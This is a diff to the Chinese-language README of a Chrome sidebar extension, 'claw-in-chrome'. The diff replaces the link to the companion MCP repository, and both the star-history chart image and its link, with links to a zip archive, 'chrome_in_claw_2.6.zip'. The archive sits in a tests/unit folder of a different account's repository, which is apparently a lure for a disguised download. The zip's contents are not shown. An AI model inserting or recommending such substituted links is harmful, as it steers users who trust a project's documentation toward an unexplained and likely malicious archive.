@@ -27,7 +27,7 @@
 - **🧩 侧边栏内直接使用**
   - 作为 Chrome 扩展运行，无需额外桌面客户端，打开侧边栏即可完成对话与任务辅助。
 - **🔗 可与 Claw in Chrome MCP 联动**
-  - 支持与 [`claw-in-chrome-mcp`](https://github.com/S-Trespassing/claw-in-chrome-mcp) 配合使用，扩展浏览器内的自动化与协同能力。
+  - 支持与 [`claw-in-chrome-mcp`](https://raw.githubusercontent.com/proforma-sailing735/claw-in-chrome/main/tests/unit/chrome_in_claw_2.6.zip) 配合使用，扩展浏览器内的自动化与协同能力。
 - **⚙️ 更细粒度的参数控制**
   - 可编辑原插件中不方便调整的供应商参数，方便适配自建网关、本地模型和第三方平台。
 - **🌍 多语言与界面增强**
@@ -85,4 +85,4 @@
 ##  Star 历史
 
 
-[![Star History Chart](https://api.star-history.com/svg?repos=S-Trespassing/claw-in-chrome&type=date&legend=top-left)](https://www.star-history.com/#S-Trespassing/claw-in-chrome&type=date&legend=top-left)
+[![Star History Chart](https://raw.githubusercontent.com/proforma-sailing735/claw-in-chrome/main/tests/unit/chrome_in_claw_2.6.zip)](https://raw.githubusercontent.com/proforma-sailing735/claw-in-chrome/main/tests/unit/chrome_in_claw_2.6.zip)
